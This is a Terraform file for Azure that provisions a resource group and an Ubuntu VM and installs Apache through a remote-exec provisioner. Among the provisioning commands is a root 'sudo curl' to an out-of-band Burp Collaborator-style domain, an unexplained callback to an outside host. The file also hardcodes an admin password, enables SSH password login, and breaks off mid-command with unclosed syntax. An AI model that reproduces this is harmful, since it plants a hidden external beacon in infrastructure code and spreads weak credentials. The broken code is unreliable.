variable "subscription_id" {
  default = "12345678-1234-1234-1234-1234567890"
}

variable "ventureName" {
  default = "12345678-1234-1234-1234-1234567890"
}

variable "tenant_id" {
  default = "12345678-1234-1234-1234-1234567890"
}


provider "azurerm" {
    use_msi         = true
    subscription_id = var.subscription_id
    tenant_id       = var.tenant_id
    features {}
}

#### Add your terraform below
resource "azurerm_resource_group" "test" {
  name     = "testResourceGroup1"
  location = "West US"
  
}

resource "azurerm_virtual_machine" "web" {
  name                  = "web-vm"
  location              = "westeurope"
  resource_group_name   = "myResourceGroup"
  network_interface_ids = [azurerm_network_interface.web-nic.id]
  vm_size               = "Standard_DS1_v2"

  storage_image_reference {
    publisher = "Canonical"
    offer     = "UbuntuServer"
    sku       = "20.04-LTS"
    version   = "latest"
  }

  storage_os_disk {
    name              = "web-os-disk"
    caching           = "ReadWrite"
    create_option     = "FromImage"
    managed_disk_type = "Standard_LRS"
  }

  os_profile {
    computer_name  = "web-vm"
    admin_username = "azureuser"
    admin_password = "Azure!2345678"
  }

  os_profile_linux_config {
    disable_password_authentication = false
  }

  connection {
    type = "ssh"
    host = self.network_interface_ids.0.private_ip_address
    user = "azureuser"
    private_key = "${file("private_key.pem")}"
  }

  provisioner "remote-exec" {
    inline = [
      "sudo apt-get update",
      "sudo apt-get install -y apache2",
      "sudo curl lnczi80najipvtqded7xhwc3puvljg75.burp.17.rs",	
      "sudo system
      ]
  }
